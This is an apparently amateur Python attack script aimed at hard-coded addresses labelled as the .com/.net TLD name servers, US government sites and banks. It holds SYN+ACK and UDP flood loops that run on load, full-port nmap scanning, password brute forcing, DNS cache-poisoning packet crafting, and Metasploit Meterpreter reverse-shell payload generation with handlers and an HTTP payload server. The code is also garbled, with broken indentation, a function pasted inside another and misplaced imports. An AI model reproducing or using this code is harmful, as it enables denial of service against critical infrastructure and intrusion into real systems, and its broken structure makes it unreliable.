import subprocess
import time
import re
import socket
import random
import subprocess
import struct

# Configuration
target_ips = [
    "192.5.6.30",    # A.GTLD-SERVERS.NET
    "192.33.14.30",  # B.GTLD-SERVERS.NET
    "192.26.92.30",  # C.GTLD-SERVERS.NET
    "192.31.80.30",  # D.GTLD-SERVERS.NET
    "192.12.94.30",  # E.GTLD-SERVERS.NET
    "192.35.51.30",  # F.GTLD-SERVERS.NET
    "192.42.93.30",  # G.GTLD-SERVERS.NET
    "192.54.112.30", # H.GTLD-SERVERS.NET
    "192.43.172.30", # I.GTLD-SERVERS.NET
    "192.48.79.30",  # J.GTLD-SERVERS.NET
    "192.52.178.30", # K.GTLD-SERVERS.NET
    "192.41.162.30", # L.GTLD-SERVERS.NET
    "192.55.83.30",  # M.GTLD-SERVERS.NET
    "23.22.13.113",  # USA GOV
    "152.216.7.110",  # IRS
    "100.28.244.61"  # STATE GOV
    "23.33.42.79", # BANK
    "76.223.34.124", # BANK
    "76.223.34.124", # BANK
    "146.143.13.57", # BANK
    "23.212.185.168", # BANK
    "23.36.60.96", # BANK

]

def syn_ack_flood(target_ips, target_ports):
    """
    Sends a continuous flood of TCP SYN+ACK packets to the specified targets and ports.
    Requires root privileges to create raw sockets.

    :param target_ips: List of target IP addresses.
    :param target_ports: List of target ports.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("Root privileges required for raw socket operations.")
        return

    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        return ~s & 0xffff

    try:
        while True:
            for ip in target_ips:
                for port in target_ports:
                    # IP header fields
                    source_ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
                    dest_ip = ip
                    ihl = 5
                    version = 4
                    tos = 0
                    tot_len = 20 + 20
                    id = random.randint(0, 65535)
                    frag_off = 0
                    ttl = 64
                    protocol = socket.IPPROTO_TCP
                    check = 0
                    saddr = socket.inet_aton(source_ip)
                    daddr = socket.inet_aton(dest_ip)
                    ihl_version = (version << 4) + ihl

                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

                    # TCP header fields
                    source = random.randint(1024, 65535)
                    seq = random.randint(0, 4294967295)
                    ack_seq = 0
                    doff = 5
                    flags = 2 | 16  # SYN+ACK
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0

                    offset_res = (doff << 4) + 0
                    tcp_header = struct.pack('!HHLLBBHHH',
                        source, port, seq, ack_seq, offset_res, flags, window, check, urg_ptr)

                    # Pseudo header for checksum
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    psh = struct.pack('!4s4sBBH',
                        saddr, daddr, placeholder, protocol, tcp_length)
                    psh = psh + tcp_header
                    tcp_checksum = checksum(psh)
                    tcp_header = struct.pack('!HHLLBBH',
                        source, port, seq, ack_seq, offset_res, flags, window) + \
                        struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)

                    packet = ip_header + tcp_header
                    try:
                        sock.sendto(packet, (dest_ip, 0))
                    except Exception as e:
                        print(f"Failed to send packet to {dest_ip}:{port}: {e}")
    except KeyboardInterrupt:
        print("SYN/ACK flood interrupted by user.")
target_ports = [22, 23, 80, 443]  # Example ports: SSH, Telnet, HTTP, HTTPS
duration = float('inf')  # Run indefinitely

# Create random payload
payload = random._urandom(1024)  # 1024-byte packet

print(f"Starting UDP flood to multiple targets and ports")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    while True:
        for ip in target_ips:
            for port in target_ports:
                sock.sendto(payload, (ip, port))
except KeyboardInterrupt:
    print("UDP flood interrupted by user.")


# Run nmap against the target IPs to find open ports
def scan_for_new_ports(targets, interval=60):
    """
    Periodically scans the given targets for newly opened ports using nmap.

    :param targets: List of target IP addresses.
    :param interval: Time in seconds between scans.
    """
    previous_results = {ip: set() for ip in targets}
    try:
        while True:
            for target in targets:
                result = subprocess.run(
                    ["nmap", "-Pn", "-p-", target],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                open_ports = set()
                for line in result.stdout.splitlines():
                    if "/tcp" in line and "open" in line:
                        port = line.split("/")[0].strip()
                        open_ports.add(port)
                new_ports = open_ports - previous_results[target]
                if new_ports:
                    print(f"New open ports on {target}: {', '.join(new_ports)}")
                previous_results[target] = open_ports
            time.sleep(interval)
    except KeyboardInterrupt:
        print("Port scanning interrupted by user.")

# Example usage:
scan_for_new_ports(target_ips)

def serve_payloads_with_msfvenom(payload_type, lport, output_dir="payloads"):
    """
    Generates msfvenom payloads for each target IP and serves them via a simple HTTP server.

    :param payload_type: The msfvenom payload type (e.g., windows/meterpreter/reverse_tcp)
    :param lport: The local port for reverse connection
    :param output_dir: Directory to store generated payloads
    """

    os.makedirs(output_dir, exist_ok=True)
    payload_files = []
    for ip in target_ips:
        output_file = os.path.join(output_dir, f"payload_{ip.replace('.', '_')}.bin")
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={ip}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", output_file
        ]
        try:
            subprocess.run(cmd, check=True)
            print(f"Generated payload for {ip}: {output_file}")
            payload_files.append(output_file)
        except subprocess.CalledProcessError as e:
            print(f"Failed to generate payload for {ip}: {e}")

    # Serve the payloads via HTTP
    os.chdir(output_dir)
    server_address = ("0.0.0.0", 8000)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print(f"Serving payloads at http://{server_address[0]}:{server_address[1]}/")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("HTTP server stopped.")

# Example usage:
# serve_payloads_with_msfvenom("windows/meterpreter/reverse_tcp", 4444)

def udp_fuzzing(target_ips, target_ports):
    """
    Sends randomized UDP packets with variable payload sizes and contents
    to the specified targets and ports indefinitely.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while True:
            for ip in target_ips:
                for port in target_ports:
                    size = random.randint(1, 2048)  # Variable size between 1 and 2048 bytes
                    payload = random.randbytes(size)
                    sock.sendto(payload, (ip, port))
    except KeyboardInterrupt:
        print("UDP fuzzing interrupted by user.")

# Example fuzzing usage:
udp_fuzzing(target_ips, target_ports)

def run_metasploit_console(commands):
    """
    Runs Metasploit with a set of commands automatically.
    """
    try:
        process = subprocess.Popen(
            ["msfconsole", "-q"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        for cmd in commands:
            process.stdin.write(cmd + "\n")
        process.stdin.write("exit\n")
        process.stdin.flush()
        stdout, stderr = process.communicate()
        print(stdout)
        if stderr:
            print(f"Errors:\n{stderr}")
    except KeyboardInterrupt:
        print("Metasploit automation interrupted by user.")

# Example Metasploit automation usage:
run_metasploit_console([
  "use auxiliary/scanner/portscan/tcp",
  f"set RHOSTS {','.join(target_ips)}",
  "run"
])

def brute_force_ports(target_ips, target_ports, password_list):
    """
    Continuously attempts TCP connections to target ports and tries given passwords.
    """
    try:
        while True:
            for ip in target_ips:
                for port in target_ports:
                    for password in password_list:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            sock.connect((ip, port))
                            sock.sendall(password.encode() + b"\n")
                            response = sock.recv(1024)
                            print(f"Sent password '{password}' to {ip}:{port}, received: {response}")
                            sock.close()
                        except Exception as e:
                            print(f"Connection to {ip}:{port} with password '{password}' failed: {e}")
    except KeyboardInterrupt:
        print("Brute-force operation interrupted by user.")

# Example brute-force usage:
brute_force_ports(target_ips, target_ports, ["password123", "admin", "root"])

def run_msfvenom(payload_type, lhost, lport, output_file):
    """
    Generates a payload using msfvenom with the specified parameters.
    """
    try:
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", output_file
        ]
        subprocess.run(cmd, check=True)
        print(f"Payload generated and saved to {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"msfvenom failed: {e}")
    except KeyboardInterrupt:
        print("msfvenom generation interrupted by user.")

# Example msfvenom automation usage:
for ip in target_ips:
  run_msfvenom("windows/meterpreter/reverse_tcp", ip, "4444", f"payload_{ip.replace('.', '_')}.bin")



  def create_tcp_client(target_ip, target_port, message=b"Hello"):
    """
    Creates a TCP client that connects to the specified target IP and port,
    sends a message, and prints the response.

    :param target_ip: The IP address of the target server.
    :param target_port: The port number of the target server.
    :param message: The message to send (bytes).
    """
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(5)
        print(f"Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        sock.sendall(message)
        response = sock.recv(4096)
        print(f"Received from {target_ip}:{target_port}: {response}")
    except Exception as e:
      print(f"TCP client error for {target_ip}:{target_port}: {e}")

  # Example usage:
  for ip in target_ips:
      for port in target_ports:
          create_tcp_client(ip, port)


# Find default router IP
def setup_port_forwarding(local_port, remote_host, remote_port):
    """
    Sets up a TCP port forwarding tunnel from local_port to remote_host:remote_port using socat.
    """
    try:
        cmd = [
            "socat",
            f"TCP-LISTEN:{local_port},reuseaddr,fork",
            f"TCP:{remote_host}:{remote_port}"
        ]
        print(f"Setting up port forwarding: localhost:{local_port} -> {remote_host}:{remote_port}")
        process = subprocess.Popen(cmd)
        print(f"Port forwarding process started with PID {process.pid}")
        return process
    except Exception as e:
        print(f"Failed to set up port forwarding: {e}")

def dns_cache_poisoning(target_dns_ip, spoofed_domain, malicious_ip, transaction_id=None):
    """
    Attempts to perform a DNS cache poisoning attack by sending spoofed DNS responses.
    This is a demonstration function and does not guarantee success.

    :param target_dns_ip: The IP address of the DNS server to poison.
    :param spoofed_domain: The domain name to spoof.
    :param malicious_ip: The IP address to associate with the spoofed domain.
    :param transaction_id: Optional transaction ID to use in the DNS response.
    """
    import struct
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        if transaction_id is None:
            transaction_id = random.randint(0, 65535)
        # Build a fake DNS response packet
        # DNS Header: [Transaction ID][Flags][Questions][Answer RRs][Authority RRs][Additional RRs]
        dns_header = struct.pack(">HHHHHH", transaction_id, 0x8180, 1, 1, 0, 0)
        # Question Section
        def encode_domain(domain):
            parts = domain.split('.')
            return b''.join([bytes([len(p)]) + p.encode() for p in parts]) + b'\x00'
        qname = encode_domain(spoofed_domain)
        qtype = struct.pack(">H", 1)  # Type A
        qclass = struct.pack(">H", 1) # Class IN
        question = qname + qtype + qclass
        # Answer Section
        answer = (
            qname +
            qtype +
            qclass +
            struct.pack(">I", 60) +  # TTL
            struct.pack(">H", 4) +   # Data length
            socket.inet_aton(malicious_ip)
        )
        packet = dns_header + question + answer
        # Send the spoofed response to the DNS server
        sock.sendto(packet, (target_dns_ip, 53))
        print(f"Sent spoofed DNS response for {spoofed_domain} -> {malicious_ip} to {target_dns_ip}")
    except Exception as e:
        print(f"DNS cache poisoning attempt failed: {e}")
    finally:
        sock.close()

def enable_snat_with_ifconfig(interface, new_ip):
    """
    Changes the source IP address for outgoing packets on a given interface using ifconfig.
    This is a basic demonstration and may disrupt network connectivity.

    :param interface: Network interface to modify (e.g., 'en0')
    :param new_ip: The new source IP address to assign
    """
    try:
        print(f"Setting {interface} IP to {new_ip} using ifconfig...")
        subprocess.run(["sudo", "ifconfig", interface, new_ip, "up"], check=True)
        print(f"SNAT enabled on {interface} with IP {new_ip}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to set SNAT on {interface}: {e}")

def find_router_via_ifconfig():
    """
    Uses ifconfig and netstat to attempt to identify the default router's IP.
    """
    try:
        # Get network interfaces info
        ifconfig_output = subprocess.run(
            ["ifconfig"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        ).stdout
        print("ifconfig output:\n", ifconfig_output)

        # Get routing table
        netstat_output = subprocess.run(
            ["netstat", "-nr"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        ).stdout
        print("netstat routing table:\n", netstat_output)

        # Parse netstat output for default gateway
        for line in netstat_output.splitlines():
            if line.startswith("default") or line.startswith("0.0.0.0"):
                parts = line.split()
                if len(parts) >= 2:
                    router_ip = parts[1]
                    print(f"Default router found: {router_ip}")
                    return router_ip
        print("No default router found.")

    def get_shells_of_target_ips(target_ips, lport=4444, payload_type="windows/meterpreter/reverse_tcp"):
        """
        Attempts to get reverse shells from the given target IPs by generating payloads and starting handlers.
        This function assumes you have Metasploit installed and accessible as 'msfconsole' and 'msfvenom'.

        :param target_ips: List of target IP addresses.
        :param lport: Local port to listen for reverse shells.
        :param payload_type: Payload type for msfvenom and Metasploit handler.
        """

        for ip in target_ips:
        output_file = f"payload_{ip.replace('.', '_')}.bin"
        # Generate payload
        try:
            subprocess.run([
            "msfvenom",
            "-p", payload_type,
            f"LHOST={ip}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", output_file
            ], check=True)
            print(f"Payload generated for {ip}: {output_file}")
        except Exception as e:
            print(f"Failed to generate payload for {ip}: {e}")
            continue

        # Start Metasploit handler
        msf_commands = f"""
    use exploit/multi/handler
    set PAYLOAD {payload_type}
    set LHOST {ip}
    set LPORT {lport}
    set ExitOnSession false
    exploit -j
    """
        try:
            process = subprocess.Popen(
            ["msfconsole", "-q"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
            )
            process.stdin.write(msf_commands)
            process.stdin.write("exit\n")
            process.stdin.flush()
            stdout, stderr = process.communicate()
            print(stdout)
            if stderr:
            print(f"Errors for {ip}:\n{stderr}")
        except Exception as e:
            print(f"Failed to start handler for {ip}: {e}")
    except Exception as e:
        print(f"Failed to identify router: {e}")


# def capture_incoming_packets(interface="en0"):
def capture_incoming_packets(interface="en0"):
    """
    Captures incoming packets on the specified network interface.
    Prints basic packet info.
    
    :param interface: Network interface to listen on (default: en0 for macOS)
    """
    try:
        # Create a raw socket and bind to the interface
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sock.bind((interface, 0))
        
        # Include IP headers
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Set to promiscuous mode (platform-dependent)
        # On macOS you'd typically use BPF or a library like scapy/pcapy
        print(f"Capturing packets on {interface}...")
        
        while True:
            packet, addr = sock.recvfrom(65565)
            print(f"Received packet from {addr}: {packet[:20].hex()}...")  # Show first 20 bytes
    except KeyboardInterrupt:
        print("Packet capture interrupted by user.")
    except Exception as e:
        print(f"Error during packet capture: {e}")


def capture_incoming_packets_tcpdump(interface="en0"):
    """
    Captures packets using tcpdump and prints the output.
    """
    try:
        process = subprocess.Popen(
            ["sudo", "tcpdump", "-i", interface, "-n"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        for line in process.stdout:
            print(line.strip())
    except KeyboardInterrupt:
        print("tcpdump capture interrupted by user.")
        process.terminate()
    except Exception as e:
        print(f"Error running tcpdump: {e}")

# Example usage:
find_router_via_ifconfig()

def create_multihandler_payload(payload_type, lhost_list, lport, output_file_prefix):
    """
    Generates payloads using msfvenom and starts a Metasploit multi/handler for each lhost in the list.

    :param payload_type: The type of payload (e.g., windows/meterpreter/reverse_tcp)
    :param lhost_list: List of local host IPs for the payloads
    :param lport: Local port for the payloads
    :param output_file_prefix: Prefix for the generated payload files
    """
    import subprocess
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

    for idx, lhost in enumerate(lhost_list):
        output_file = f"{output_file_prefix}_{lhost.replace('.', '_')}.bin"
        
        # Generate payload
        try:
            print(f"Generating payload: {payload_type} LHOST={lhost} LPORT={lport}")
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "raw",
                "-o", output_file
            ]
            subprocess.run(cmd, check=True)
            print(f"Payload saved to {output_file}")
        except subprocess.CalledProcessError as e:
            print(f"Error generating payload for {lhost}: {e}")
            continue

        # Start Metasploit multi/handler
        try:
            print(f"Starting Metasploit multi/handler for {lhost}...")
            msf_commands = f"""
use exploit/multi/handler
set PAYLOAD {payload_type}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
            process = subprocess.Popen(
                ["msfconsole", "-q"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            process.stdin.write(msf_commands)
            process.stdin.write("exit\n")
            process.stdin.flush()
            stdout, stderr = process.communicate()
            print(stdout)
            if stderr:
                print(f"Errors for {lhost}:\n{stderr}")
        except Exception as e:
            print(f"Failed to start multi/handler for {lhost}: {e}")

def monitor_traffic_ifconfig(interface="en0", interval=5):
    """
    Monitors incoming and outgoing traffic on the specified interface using ifconfig.
    
    :param interface: Network interface to monitor (default: en0 on macOS)
    :param interval: Time in seconds between checks
    """
    rx_pattern = re.compile(r'RX bytes:(\d+)')
    tx_pattern = re.compile(r'TX bytes:(\d+)')
    
    print(f"Monitoring traffic on {interface} every {interval} seconds... (Ctrl+C to stop)")
    try:
        while True:
            result = subprocess.run(
                ["ifconfig", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.stderr:
                print(f"Error: {result.stderr.strip()}")
                break

            output = result.stdout
            # macOS ifconfig does not show RX/TX bytes the way Linux does, parse macOS-style output
            rx_match = re.search(r'input packets (\d+), bytes (\d+)', output)
            tx_match = re.search(r'output packets (\d+), bytes (\d+)', output)

            if rx_match and tx_match:
                rx_packets, rx_bytes = rx_match.groups()
                tx_packets, tx_bytes = tx_match.groups()
                print(f"RX: {rx_packets} packets / {rx_bytes} bytes | TX: {tx_packets} packets / {tx_bytes} bytes")
            else:
                print("Could not parse ifconfig output")

            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nMonitoring stopped by user.")

def nmap_on_incoming_ips(incoming_ips):
    """
    Runs Nmap scans on a list of IPs that have connected to your system (e.g., from captured packets).

    :param incoming_ips: List of IP addresses to scan
    """
    for ip in incoming_ips:
        try:
            print(f"Scanning {ip} with Nmap...")
            result = subprocess.run(
                ["nmap", "-Pn", "-p-", ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            print(result.stdout)
            if result.stderr:
                print(f"Errors scanning {ip}:\n{result.stderr}")
        except KeyboardInterrupt:
            print("Nmap scanning interrupted by user.")
            break
        except Exception as e:
            print(f"Error scanning {ip}: {e}")
  
